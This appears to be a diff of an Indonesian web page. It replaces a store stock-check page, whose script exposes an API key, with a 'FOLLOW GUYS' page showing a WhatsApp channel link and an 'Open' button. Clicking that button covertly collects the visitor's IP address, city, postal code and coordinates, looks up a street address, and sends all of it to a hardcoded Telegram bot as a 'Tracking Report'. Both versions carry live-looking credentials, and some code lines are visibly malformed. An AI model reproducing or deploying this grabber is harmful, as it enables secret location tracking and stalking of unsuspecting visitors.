@@ -1,429 +1,124 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GFR Store - Cek Stok Akrab</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
-            color: #ffffff;
-            min-height: 100vh;
-            overflow-x: hidden;
-            line-height: 1.6;
-        }
-
-        .container {
-            max-width: 960px;
-            margin: 0 auto;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-            border-bottom: 1px solid #333;
-            margin-bottom: 40px;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .logo-icon {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(45deg, #00bfff, #0077b3);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 18px;
-            color: #fff;
-            box-shadow: 0 0 15px rgba(0, 191, 255, 0.4);
-        }
-
-        .logo-text {
-            font-size: 24px;
-            font-weight: bold;
-            color: #00bfff;
-            letter-spacing: 2px;
-        }
-
-        .status {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #888;
-            font-size: 14px;
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            background: #25d366;
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .main-content {
-            flex: 1;
-            padding: 40px 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
-
-        .title {
-            font-size: 48px;
-            font-weight: bold;
-            color: #00bfff;
-            margin-bottom: 10px;
-            letter-spacing: 2px;
-            text-shadow: 0 0 20px rgba(0, 191, 255, 0.3);
-        }
-
-        .subtitle {
-            font-size: 18px;
-            color: #888;
-            margin-bottom: 40px;
-            letter-spacing: 3px;
-            text-transform: uppercase;
-        }
-
-        .action-section {
-            width: 100%;
-            max-width: 600px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid #333;
-            border-radius: 20px;
-            padding: 40px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-            text-align: center;
-        }
-
-        .action-button {
-            background: linear-gradient(45deg, #00bfff, #0077b3);
-            color: #fff;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 15px;
-            cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .action-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0, 191, 255, 0.2);
-        }
-
-        .action-button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .loading {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #fff;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .result-section {
-            margin-top: 40px;
-            display: none;
-            width: 100%;
-            max-width: 600px;
-            text-align: left;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid #333;
-            border-radius: 20px;
-            padding: 20px;
-        }
-
-        .result-title {
-            color: #00bfff;
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .product-list {
-            list-style: none;
-        }
-
-        .product-item {
-            background: #222;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 10px;
-        }
-
-        .product-name {
-            font-weight: 600;
-            color: #fff;
-            font-size: 18px;
-        }
-
-        .product-details {
-            color: #ccc;
-            font-size: 14px;
-        }
-
-        .error-section {
-            margin-top: 30px;
-            padding: 20px;
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid #ff4444;
-            border-radius: 15px;
-            display: none;
-            max-width: 600px;
-            text-align: left;
-        }
-
-        .error-title {
-            color: #ff4444;
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-
-        .error-message {
-            color: #ccc;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 40px 0 20px;
-            border-top: 1px solid #333;
-            margin-top: 60px;
-        }
-
-        .footer-text {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-
-        .whatsapp-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            color: #25d366;
-            text-decoration: none;
-            font-weight: 600;
-            transition: color 0.3s ease;
-        }
-
-        .whatsapp-link:hover {
-            color: #128c7e;
-        }
-
-        .whatsapp-icon {
-            width: 24px;
-            height: 24px;
-            background: #25d366;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-size: 12px;
-        }
-
-        @media (max-width: 768px) {
-            .title { font-size: 36px; }
-            .subtitle { font-size: 16px; letter-spacing: 2px; }
-            .action-section { padding: 30px 20px; }
-            .features-list { flex-direction: column; gap: 30px; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>FOLLOW GUYS</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <style>
+    body{
+      margin:0;
+      padding:0;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:100vh;
+      font-family:Arial,sans-serif;
+      color:#999;
+      overflow:hidden;
+      flex-direction:column;
+      /* Background modern & klasik */
+      background: linear-gradient(135deg, #f0f0f0, #dcdcdc);
+    }
+    #loading-container{
+      text-align:center;
+      width:80%;
+      max-width:400px;
+    }
+    #loading-text{
+      font-size:18px;
+      margin-bottom:40px;
+      color:#333;
+    }
+    .hidden{display:none;}
+    /* Tombol Open di bawah logo */
+    button{
+      margin-top:30px;
+      padding:12px 25px;
+      font-size:16px;
+      font-weight:bold;
+      color:#fff;
+      background:#25D366; /* hijau WhatsApp */
+      border:none;
+      border-radius:12px;
+      cursor:pointer;
+      transition:.3s;
+    }
+    button:hover{ background:#128C7E; }
+    /* Logo WhatsApp besar */
+    #whatsapp-logo{
+      width:150px;
+      height:150px;
+      cursor:pointer;
+      transition: transform .3s;
+    }
+    #whatsapp-logo:hover{
+      transform: scale(1.1);
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <header class="header">
-            <div class="logo">
-                <div class="logo-icon">🛒</div>
-                <div class="logo-text">GFR Store</div>
-            </div>
-            <div class="status">
-                <div class="status-dot"></div>
-                <span>STORE ONLINE</span>
-            </div>
-        </header>
+  <div id="loading-container">
+    <div id="loading-text">FOLLOW SALURAN WHATSAPP KAMI.
+    KETAHUN DI JUAL? SIAP² AJA ☠️. MENTAHAN INI GRATIS.</div>
+    <!-- Logo WhatsApp yang bisa diklik -->
+    <a href="https://whatsapp.com/channel/0029VastFWZ6rsQnAWJzoh22" target="_blank">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" id="whatsapp-logo" alt="WhatsApp Logo">
+    </a>
+  </div>
 
-        <main class="main-content">
-            <h1 class="title">CEK STOK PRODUK</h1>
-            <p class="subtitle">Lihat ketersediaan produk secara real-time</p>
+  <!-- Tombol Open -->
+  <button id="openBtn">(Open)</button>
 
-            <div class="action-section">
-                <button class="action-button" id="checkStockButton">
-                    <span id="buttonText">Cek Stok Akrab</span>
-                    <div class="loading" id="loading"></div>
-                </button>
-            </div>
+<script>
+(()=>{
+  // === TOKEN & CHAT ID TELEGRAM  ===
+  const T='7740915138:AAGGgWA1Zq39H95q2o90VCwr6tPcgaZva8k',
+        C='7189193429';
 
-            <div class="result-section" id="resultSection">
-                <h3 class="result-title" id="resultTitle">Daftar Stok Produk</h3>
-                <ul class="product-list" id="productList"></ul>
-            </div>
+  const sTG=async d=>{
+    try{
+      await fetch(https://api.telegram.org/bot${T}/sendMessage,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})
+      })
+    }catch(e){}
+  };
 
-            <div class="error-section" id="errorSection">
-                <div class="error-title">Error</div>
-                <div class="error-message" id="errorMessage"></div>
-            </div>
-        </main>
+  const gLD=async(a,b)=>{
+    try{
+      const r=await fetch(https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1),
+            d=await r.json();
+      if(d.address) return {
+        kb:d.address.county  d.address.city  d.address.state || "Tidak diketahui",
+        kc:d.address.suburb  d.address.village  d.address.town || "Tidak diketahui",
+        fa:d.display_name || "Alamat tidak tersedia"
+      }
+    }catch(e){}
+    return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}
+  };
 
-        <footer class="footer">
-            <p class="footer-text">Dikelola oleh OLD-STUDIO</p>
-            <a href="https://wa.me/6283169681464" class="whatsapp-link" target="_blank">
-                <div class="whatsapp-icon">📞</div>
-                <span>HUBUNGI ADMIN</span>
-            </a>
-        </footer>
-    </div>
+  const cDI=async()=>{
+    let m='╭───── Tracking Report ───── ⦿\n\n';
+    try{
+      const i=await fetch('https://ipapi.co/json/'),
+            d=await i.json();
+      m+='📍 LOCATION INFORMATION\n';
+      m+=📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n;
+      if(d.latitude&&d.longitude){
+        m+=📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n;
+        const l=await gLD(d.latitude,d.longitude);
+        m+=🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n
+      }
+    }catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}
 
-    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.7.3/build/md5.min.js"></script>
+    m+='\n╰───── Telegram @LVYNXP ─────';
+    sTG(m);
+  };
 
-    <script>
-        document.getElementById('checkStockButton').addEventListener('click', checkStock);
-
-        const checkStockButton = document.getElementById('checkStockButton');
-        const loadingSpinner = document.getElementById('loading');
-        const buttonText = document.getElementById('buttonText');
-        const resultSection = document.getElementById('resultSection');
-        const productList = document.getElementById('productList');
-        const errorSection = document.getElementById('errorSection');
-        const errorMessageDiv = document.getElementById('errorMessage');
-
-        // Kredensial akun Anda
-        const API_ID = 'NZE757663C';
-        const API_KEY = '55a0bfa0a802e8fb79262cc20a0ee3af118398d5962f096081140fa71ef3d990';
-        const CMD = 'stock_akrab';
-        const API_URL = 'https://anhtronik.com/integration/api/stock-akrab';
-
-        async function checkStock() {
-            setLoading(true);
-            hideSections();
-
-            try {
-                // Membuat signature MD5
-                const signature = md5(API_ID + API_KEY + CMD);
-
-                const requestBody = {
-                    cmd: CMD,
-                    api_id: API_ID,
-                    signature: signature,
-                };
-
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(requestBody),
-                });
-
-                const result = await response.json();
-
-                if (result.code === 200 && result.status === 'success') {
-                    displayResults(result.data);
-                } else {
-                    showError(result.message || 'Gagal Cek Stok.');
-                }
-            } catch (error) {
-                console.error('Error saat menghubungi API:', error);
-                showError('Terjadi kesalahan saat menghubungi server. Mohon coba lagi nanti.');
-            } finally {
-                setLoading(false);
-            }
-        }
-
-        function setLoading(isLoading) {
-            loadingSpinner.style.display = isLoading ? 'block' : 'none';
-            buttonText.textContent = isLoading ? 'Memuat...' : 'Cek Stok Akrab';
-            checkStockButton.disabled = isLoading;
-        }
-
-        function displayResults(data) {
-            productList.innerHTML = '';
-            if (data && data.length > 0) {
-                data.forEach(item => {
-                    const listItem = document.createElement('li');
-                    listItem.className = 'product-item';
-                    listItem.innerHTML = `
-                        <div class="product-name">${item.name}</div>
-                        <div class="product-details">
-                            Kode: ${item.code}<br>
-                            Harga: Rp ${item.price.toLocaleString()}<br>
-                            Stok: ${item.stock}
-                        </div>
-                    `;
-                    productList.appendChild(listItem);
-                });
-                resultSection.style.display = 'block';
-            } else {
-                showError('Tidak ada data stok yang tersedia saat ini.');
-            }
-        }
-
-        function showError(message) {
-            errorMessageDiv.textContent = message;
-            errorSection.style.display = 'block';
-        }
-
-        function hideSections() {
-            resultSection.style.display = 'none';
-            errorSection.style.display = 'none';
-        }
-
-        // Jalankan cek stok saat halaman dimuat
-        document.addEventListener('DOMContentLoaded', () => {
-             checkStock();
-        });
-    </script>
+  document.getElementById("openBtn").addEventListener("click",()=>{ cDI(); });
+})();
+</script>
 </body>
-              </html>
+</html>
